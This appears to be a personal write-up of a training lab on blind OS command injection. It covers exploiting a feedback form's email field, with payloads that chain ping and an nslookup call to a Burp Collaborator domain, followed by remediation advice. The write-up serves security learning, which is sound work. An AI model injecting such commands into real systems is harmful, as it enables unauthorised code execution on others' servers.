## 🧪 Lab: Blind OS Command Injection with Out-of-Band Interaction  
**Level**: Practitioner  
**Date**: June 20, 2025  
**Goal**: Exploit a blind OS command injection vulnerability by using out-of-band (OAST) interaction.

---

### 🧰 Tools  
- Burp Suite Pro (Collaborator client)  
- Repeater  
- OAST-based payloads (`nslookup`)  

---

### 🧭 Steps

1. Intercept the request to the feedback form:
POST /feedback/submit

2. Send the request to **Repeater**.

3. Identify the injectable parameter (in this lab, `email` field):

```
email=a@gmail.com
```


4. Test a simple injection to confirm command execution (no output is expected):
```
email=a@gmail.com & ping -c 5 127.0.0.1 #
```

🔁 This has **no output**, so we suspect a blind command injection.

5. Move to **Out-of-Band testing**:
Use `nslookup` to make the server contact your **Burp Collaborator** domain.

6. Replace the email with this payload:
```
a%40gmail.com& nslookup d5jziuy7pyb6gzzy4kz1wyv60x6pufi4.oastify.com #
```

7. Switch to the **Burp Collaborator** tab and click "**Poll now**".

✅ If the DNS interaction appears in the Collaborator logs, it confirms the payload was executed successfully by the server.

---

### 💣 Payload Used

```
a%40gmail.com& nslookup d5jziuy7pyb6gzzy4kz1wyv60x6pufi4.oastify.com #
```

---

### 💡 Observations

- This is a **blind injection** → No direct reflection or error on the page.
- `nslookup` is used to **force the server** to do a DNS lookup to an attacker-controlled domain.
- Seeing the DNS request in **Burp Collaborator** = Proof of code execution.
- `&` is used to chain commands. `#` comments out the rest of the original command to avoid breaking the injection.

---

### 🔒 Remediation

- Avoid passing user input to shell commands.
- Use secure system call libraries or APIs.
- Validate and sanitize all input strictly (especially headers, query params, form fields).
- Disable unnecessary network access on backend servers (e.g., block outbound DNS when not needed).

---

### 🧠 Notes to Self

- OAST can be confusing but is super powerful.
- No reflection ≠ No vulnerability.
- Collaborator confirms what we **can’t see in the browser**.
- Keep practicing — these are real-world exploit skills.